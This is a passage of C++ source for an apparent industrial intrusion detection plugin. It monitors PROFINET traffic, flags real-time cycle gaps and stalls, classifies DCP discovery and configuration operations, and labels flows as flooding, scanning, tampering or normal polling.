            if (delta_cycles > 1) {
                channel.missed_cycles += (uint32_t)(delta_cycles - 1);
                if (!channel.jitter_alerted) {
                    PSRAMUtils::ScopedBuffer buf(256);
                    if (buf.valid()) {
                        psram_string mac_str = mac_to_str(pkt.src_mac);
                        snprintf(buf.get(), buf.size(),
                                 "{\"type\":\"profinet_cycle_gap\",\"device\":\"%s\",\"frame_id\":\"0x%04X\",\"missed_cycles\":%u}",
                                 mac_str.c_str(), frame_id, (unsigned)(delta_cycles - 1));
                        reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(buf.get()),
                                             is_irt ? LogLevel::ERROR : LogLevel::WARNING);
                    }
                    channel.jitter_alerted = true;
                    alert_generated = true;
                }
            } else if (delta_cycles == 0 && pkt.ts_ms > channel.last_ts_ms + 500) {
                // no progress in cycle counter for too long
                if (!channel.jitter_alerted) {
                    PSRAMUtils::ScopedBuffer buf(256);
                    if (buf.valid()) {
                        psram_string mac_str = mac_to_str(pkt.src_mac);
                        snprintf(buf.get(), buf.size(),
                                 "{\"type\":\"profinet_cycle_stall\",\"device\":\"%s\",\"frame_id\":\"0x%04X\"}",
                                 mac_str.c_str(), frame_id);
                        reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(buf.get()), LogLevel::WARNING);
                    }
                    channel.jitter_alerted = true;
                    alert_generated = true;
                }
            }
            channel.last_cycle = cycle_counter;
            channel.last_ts_ms = pkt.ts_ms;
            channel.samples++;
            channel.is_irt = channel.is_irt || is_irt;
        }
    }

    return alert_generated;
}

psram_string PROFINETPlugin::macKeyToString(uint64_t mac_key) {
    if (mac_key == 0 || mac_key == 0xFFFFFFFFFFFFULL) {
        return PSRAMUtils::createPSRAMString("unknown");
    }
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             (unsigned)((mac_key >> 40) & 0xFF),
             (unsigned)((mac_key >> 32) & 0xFF),
             (unsigned)((mac_key >> 24) & 0xFF),
             (unsigned)((mac_key >> 16) & 0xFF),
             (unsigned)((mac_key >> 8) & 0xFF),
             (unsigned)(mac_key & 0xFF));
    return PSRAMUtils::createPSRAMString(buf);
}

void PROFINETPlugin::getRealtimeSummary(RealtimeSummary& out) const {
    out = RealtimeSummary();

    {
        std::lock_guard<std::mutex> lock(rt_mutex_);
        out.channels.reserve(rt_channels_.size());
        for (const auto& entry : rt_channels_) {
            const RtChannelState& channel = entry.second;
            out.total_channels++;
            if (channel.is_irt) {
                out.irt_channels++;
            }
            if (channel.jitter_alerted) {
                out.jitter_alerts++;
            }
            out.total_missed_cycles += channel.missed_cycles;

            RtChannelSnapshot snapshot;
            snapshot.frame_id = static_cast<uint16_t>((entry.first >> 48) & 0xFFFF);
            snapshot.is_irt = channel.is_irt;
            snapshot.samples = channel.samples;
            snapshot.missed_cycles = channel.missed_cycles;
            snapshot.jitter_alerted = channel.jitter_alerted;
            snapshot.last_ts_ms = channel.last_ts_ms;
            snapshot.last_cycle = channel.last_cycle;
            snapshot.mac = macKeyToString(entry.first & 0xFFFFFFFFFFFFULL);
            out.channels.push_back(std::move(snapshot));
        }
    }

    {
        std::lock_guard<std::mutex> lock(sync_mutex_);
        out.sync_devices.reserve(sync_states_.size());
        for (const auto& entry : sync_states_) {
            const SyncState& state = entry.second;
            if (state.locked) {
                out.sync_locked_devices++;
            } else {
                out.sync_unlocked_devices++;
            }

            SyncDeviceSnapshot snap;
            snap.mac = macKeyToString(entry.first);
            snap.locked = state.locked;
            snap.valid_streak = state.valid_streak;
            snap.invalid_streak = state.invalid_streak;
            out.sync_devices.push_back(std::move(snap));
        }
    }

    std::sort(out.channels.begin(), out.channels.end(),
              [](const RtChannelSnapshot& a, const RtChannelSnapshot& b) {
                  if (a.is_irt != b.is_irt) {
                      return a.is_irt && !b.is_irt;
                  }
                  return a.samples > b.samples;
              });

    if (out.channels.size() > 16) {
        out.channels.resize(16);
    }
}

// Enhanced IDS method for real-time packet analysis - COMMENTED OUT (not declared in header)
/*
bool PROFINETPlugin::checkPacket(uint32_t now_ms, uint32_t src, uint32_t dst, const uint8_t* pdu, size_t pdu_len) {
    // Basic validation - PROFINET DCP packets should have at least 14 bytes (Eth header) + DCP header
    if (!pdu || pdu_len < 26) return false;

    // Check if this is a PROFINET DCP packet (EtherType 0x8892)
    if (pdu[12] != 0x88 || pdu[13] != 0x92) return false;

    bool alert_generated = false;

    // Parse DCP header (starting at offset 14 after Ethernet header)
    const uint8_t* dcp = pdu + 14;
    size_t dcp_len = pdu_len - 14;

    if (dcp_len < 12) return false; // Minimum DCP header size

    // uint16_t frame_id = be16(dcp + 0); // TODO: Use in future analysis
    uint8_t service_id = dcp[2];
    uint8_t service_type = dcp[3];
    uint16_t dcp_data_len = be16(dcp + 10);

    // Check for malformed DCP packets
    if (dcp_data_len > dcp_len - 12) {
        alert_generated = true; // DCP data length exceeds packet size
    }

    // DCP Spoofing detection - monitor for suspicious DCP responses
    if (service_id == 0x05 && service_type >= 0x01) { // Identify response
        static psram_map<uint32_t, uint32_t> identify_responses;
        static psram_map<uint32_t, uint32_t> response_time;

        uint32_t current_time = now_ms / 1000;
        identify_responses[src]++;

        // Too many identify responses from same source in short time
        if (response_time[src] && (current_time - response_time[src]) < 30) {
            if (identify_responses[src] > 20) { // More than 20 responses in 30 seconds
                alert_generated = true;
            }
        } else {
            identify_responses[src] = 1;
        }
        response_time[src] = current_time;
    }

    // Suspicious configuration changes (Set operations)
    if (service_id == 0x04 && service_type == 0x00) { // Set request
        static psram_map<uint32_t, uint32_t> config_changes;
        static psram_map<uint32_t, uint32_t> config_time;

        uint32_t current_time = now_ms / 1000;
        config_changes[src]++;

        // Multiple configuration changes could indicate malicious activity
        if (config_time[src] && (current_time - config_time[src]) < 120) {
            if (config_changes[src] > 5) { // More than 5 config changes in 2 minutes
                alert_generated = true;
            }
        } else {
            config_changes[src] = 1;
        }
        config_time[src] = current_time;
    }

    // Check for topology manipulation attempts
    // Monitor for rapid succession of Get/Set operations that could indicate scanning
    static psram_map<uint32_t, uint32_t> operation_count;
    static psram_map<uint32_t, uint32_t> operation_time;

    if (service_id == 0x03 || service_id == 0x04) { // Get or Set operations
        uint32_t current_time = now_ms / 1000;
        operation_count[src]++;

        if (operation_time[src] && (current_time - operation_time[src]) < 10) {
            if (operation_count[src] > 10) { // More than 10 operations in 10 seconds
                alert_generated = true;
            }
        } else {
            operation_count[src] = 1;
        }
        operation_time[src] = current_time;
    }

    return alert_generated;
}
*/

// ============================================================================
// FLOW MANAGEMENT IMPLEMENTATION (PROFINET)
// ============================================================================

bool PROFINETPlugin::buildFlowKey(const NetworkPacket& packet, FlowKey& key) {
    // L2 ingest path provides pkt.data at PROFINET payload start:
    // FrameID(2) + ServiceID(1) + ServiceType(1) + ...
    if (packet.ether_type != htons(0x8892) || packet.length < 2) return false;

    const uint8_t* data = packet.data;
    uint16_t frame_id = rd16be(data + 0);

    PSRAMAllocator<char> alloc;

    // For PROFINET, source/dest are MAC addresses from NetworkPacket metadata.
    char src_mac_str[18], dst_mac_str[18];
    snprintf(src_mac_str, sizeof(src_mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
            packet.src_mac[0], packet.src_mac[1], packet.src_mac[2],
            packet.src_mac[3], packet.src_mac[4], packet.src_mac[5]);
    snprintf(dst_mac_str, sizeof(dst_mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
            packet.dst_mac[0], packet.dst_mac[1], packet.dst_mac[2],
            packet.dst_mac[3], packet.dst_mac[4], packet.dst_mac[5]);

    key.src_ip = psram_string(src_mac_str, alloc);
    key.dst_ip = psram_string(dst_mac_str, alloc);
    key.src_port = 0;  // No ports in Layer 2
    key.dst_port = 0;

    // Protocol-specific: Frame ID as hex string
    // Frame ID ranges:
    // 0xFEFC-0xFEFF: DCP (Discovery and Configuration Protocol)
    // 0xC000-0xFAFF: RT Class 1 cyclic data
    // 0x0100-0x0FFF: RT Class 2/3
    char frame_id_str[32];
    if (frame_id >= 0xFEFC && frame_id <= 0xFEFF) {
        snprintf(frame_id_str, sizeof(frame_id_str), "DCP_0x%04X", frame_id);
    } else if (frame_id >= 0xC000 && frame_id <= 0xFAFF) {
        snprintf(frame_id_str, sizeof(frame_id_str), "RT1_0x%04X", frame_id);
    } else {
        snprintf(frame_id_str, sizeof(frame_id_str), "PN_0x%04X", frame_id);
    }
    key.protocol_specific = psram_string(frame_id_str, alloc);

    return true;
}

bool PROFINETPlugin::classifyPacketOperation(const NetworkPacket& packet,
                                             psram_string& operation_type,
                                             psram_string& operation_details,
                                             bool& is_error) {
    if (packet.ether_type != htons(0x8892) || packet.length < 2) return false;

    const uint8_t* data = packet.data;
    PSRAMAllocator<char> alloc;
    is_error = false;
    uint16_t frame_id = rd16be(data + 0);

    char details[256];

    // Classify based on Frame ID range
    if (frame_id >= 0xFEFC && frame_id <= 0xFEFF) {
        // DCP (Discovery and Configuration Protocol)
        if (packet.length < 4) {
            operation_type = psram_string("OTHER", alloc);
            snprintf(details, sizeof(details), "DCP_FrameID=0x%04X (truncated)", frame_id);
            operation_details = psram_string(details, alloc);
            return true;
        }

        const uint8_t* dcp = data;
        uint8_t service_id = dcp[2];
        uint8_t service_type = dcp[3];

        // Check for error response (service_type = 0x05)
        if (service_type == PROFINET::DCP_RESPONSE_UNSUPPORTED) {
            is_error = true;
            operation_type = psram_string("ERROR", alloc);
            snprintf(details, sizeof(details),
                    "DCP_ServiceID=0x%02X Response=Unsupported FrameID=0x%04X",
                    service_id, frame_id);
            operation_details = psram_string(details, alloc);
            return true;
        }

        // Classify DCP service
        switch (service_id) {
            case PROFINET::DCP_SERVICE_IDENTIFY:
                operation_type = psram_string("DIAGNOSTIC", alloc);
                snprintf(details, sizeof(details),
                        "DCP_Identify Type=0x%02X FrameID=0x%04X",
                        service_type, frame_id);
                break;

            case PROFINET::DCP_SERVICE_GET:
                operation_type = psram_string("READ", alloc);
                snprintf(details, sizeof(details),
                        "DCP_Get Type=0x%02X FrameID=0x%04X",
                        service_type, frame_id);
                break;

            case PROFINET::DCP_SERVICE_SET:
                operation_type = psram_string("WRITE", alloc);
                snprintf(details, sizeof(details),
                        "DCP_Set Type=0x%02X FrameID=0x%04X",
                        service_type, frame_id);
                break;

            case PROFINET::DCP_SERVICE_HELLO:
                operation_type = psram_string("CONTROL", alloc);
                snprintf(details, sizeof(details),
                        "DCP_Hello Type=0x%02X FrameID=0x%04X",
                        service_type, frame_id);
                break;

            default:
                operation_type = psram_string("OTHER", alloc);
                snprintf(details, sizeof(details),
                        "DCP_0x%02X Type=0x%02X FrameID=0x%04X",
                        service_id, service_type, frame_id);
                break;
        }

    } else if (frame_id >= 0xC000 && frame_id <= 0xFAFF) {
        // RT Class 1 cyclic data - this is regular I/O data exchange
        operation_type = psram_string("READ", alloc);  // Cyclic reads are most common
        snprintf(details, sizeof(details), "RT_Cyclic_Data FrameID=0x%04X", frame_id);

    } else if (frame_id >= 0x0100 && frame_id <= 0x0FFF) {
        // RT Class 2/3 - isochronous or high-priority
        operation_type = psram_string("READ", alloc);
        snprintf(details, sizeof(details), "RT_Class2/3 FrameID=0x%04X", frame_id);

    } else {
        // Other PROFINET frames
        operation_type = psram_string("OTHER", alloc);
        snprintf(details, sizeof(details), "PN_Frame FrameID=0x%04X", frame_id);
    }

    operation_details = psram_string(details, alloc);
    return true;
}

void PROFINETPlugin::updateProtocolState(const NetworkPacket& packet, FlowData& flow) {
    // PROFINET state machine:
    // INIT -> CONNECTING (DCP configuration) -> ESTABLISHED (DCP complete) ->
    // DATA_EXCHANGE (RT cyclic data) -> CLOSING -> CLOSED

    if (packet.ether_type != htons(0x8892) || packet.length < 2) return;

    const uint8_t* data = packet.data;
    uint16_t frame_id = rd16be(data + 0);

    if (flow.state == FlowState::INIT) {
        if (frame_id >= 0xFEFC && frame_id <= 0xFEFF) {
            // DCP packet - device discovery/configuration
            if (packet.length >= 4) {
                const uint8_t* dcp = data;
                uint8_t service_id = dcp[2];

                if (service_id == PROFINET::DCP_SERVICE_IDENTIFY ||
                    service_id == PROFINET::DCP_SERVICE_GET) {
                    flow.state = FlowState::CONNECTING;
                } else if (service_id == PROFINET::DCP_SERVICE_SET) {
                    flow.state = FlowState::CONNECTING;  // Configuration in progress
                }
            }
        } else if (frame_id >= 0xC000 && frame_id <= 0xFAFF) {
            // RT cyclic data - already established
            flow.state = FlowState::DATA_EXCHANGE;
        }
        return;
    }

    if (flow.state == FlowState::CONNECTING) {
        if (frame_id >= 0xFEFC && frame_id <= 0xFEFF && packet.length >= 4) {
            const uint8_t* dcp = data;
            uint8_t service_type = dcp[3];

            // DCP response success indicates configuration complete
            if (service_type == PROFINET::DCP_RESPONSE_SUCCESS) {
                flow.state = FlowState::ESTABLISHED;
            }
        }
        return;
    }

    if (flow.state == FlowState::ESTABLISHED) {
        if (frame_id >= 0xC000 && frame_id <= 0xFAFF) {
            // First RT cyclic data packet
            flow.state = FlowState::DATA_EXCHANGE;
        }
        return;
    }

    // DATA_EXCHANGE state continues as long as RT packets flow
    // No explicit close mechanism in PROFINET RT - timeout handled by FlowTable
}

void PROFINETPlugin::assignFlowLabel(FlowData& flow) {
    // 1. Check for flooding attacks
    if (flow.metrics.intensity == FlowIntensity::FLOODING) {
        flow.metrics.primary_label = FlowLabel::FLOODING;
        flow.metrics.secondary_label = FlowLabel::ATTACK_CONFIRMED;
        return;
    }

    // 2. Check for excessive error rate
    if (flow.metrics.hasTooManyErrors(0.3f)) {
        flow.metrics.primary_label = FlowLabel::SUSPICIOUS;
        flow.metrics.secondary_label = FlowLabel::PROTOCOL_VIOLATION;
        return;
    }

    // 3. Check for DCP flooding (excessive configuration attempts)
    uint32_t dcp_set_count = 0, dcp_identify_count = 0;
    for (const auto& op : flow.recent_operations) {
        if (op.type == "WRITE" && op.details.find("DCP_Set") != psram_string::npos) {
            dcp_set_count++;
        } else if (op.type == "DIAGNOSTIC" && op.details.find("DCP_Identify") != psram_string::npos) {
            dcp_identify_count++;
        }
    }

    if (dcp_set_count > 15 && flow.metrics.intensity >= FlowIntensity::HIGH) {
        flow.metrics.primary_label = FlowLabel::SUSPICIOUS;
        flow.metrics.secondary_label = FlowLabel::CONFIGURATION_TAMPERING;
        return;
    }

    if (dcp_identify_count > 30 && flow.metrics.intensity >= FlowIntensity::VERY_HIGH) {
        flow.metrics.primary_label = FlowLabel::SCANNER;
        flow.metrics.secondary_label = FlowLabel::RECONNAISSANCE;
        return;
    }

    // 4. Check for scanning/reconnaissance patterns
    if (flow.metrics.intensity >= FlowIntensity::VERY_HIGH &&
        flow.getOperationCount() > 50 &&
        (flow.metrics.isReader() || flow.metrics.control_operations > 20)) {
        flow.metrics.primary_label = FlowLabel::SCANNER;
        flow.metrics.secondary_label = FlowLabel::RECONNAISSANCE;
        return;
    }

    // 5. Normal classification based on operation types
    if (flow.metrics.write_operations > 0 &&
        flow.metrics.write_operations > flow.metrics.read_operations * 0.5f) {
        // Significant write activity (DCP Set operations)
        flow.metrics.primary_label = FlowLabel::WRITER;
        if (dcp_set_count > 5) {
            flow.metrics.secondary_label = FlowLabel::CONFIGURATION_TAMPERING;
        }
    } else if (flow.metrics.read_operations > flow.metrics.write_operations * 3) {
        // Mostly cyclic RT data
        flow.metrics.primary_label = FlowLabel::READER;
        // Check for regular polling pattern (RT cyclic is expected to be regular)
        if (flow.metrics.intensity >= FlowIntensity::LOW &&
            flow.metrics.intensity <= FlowIntensity::HIGH &&
            flow.metrics.read_operations > 20) {
            flow.metrics.secondary_label = FlowLabel::POLLING;
        }
    } else if (flow.metrics.control_operations > flow.metrics.read_operations + flow.metrics.write_operations) {
        // Mostly DCP discovery/configuration
        flow.metrics.primary_label = FlowLabel::DIAGNOSTIC;
    } else {
        flow.metrics.primary_label = FlowLabel::MIXED_RW;
    }

    // 6. Mark heavy RT cyclic users
    if (flow.metrics.intensity == FlowIntensity::HIGH &&
        flow.metrics.primary_label == FlowLabel::READER) {
        flow.metrics.secondary_label = FlowLabel::HEAVY_USER;
    }

    // 7. Check for VERY_HIGH intensity on RT cyclic (could indicate IRT abuse)
    if (flow.metrics.intensity == FlowIntensity::VERY_HIGH &&
        flow.metrics.read_operations > 100 &&
        flow.metrics.primary_label == FlowLabel::READER) {
        // Very high cyclic rate - potentially IRT or misconfiguration
        flow.metrics.primary_label = FlowLabel::SUSPICIOUS;
        flow.metrics.secondary_label = FlowLabel::TEMPORAL_ANOMALY;
    }
}
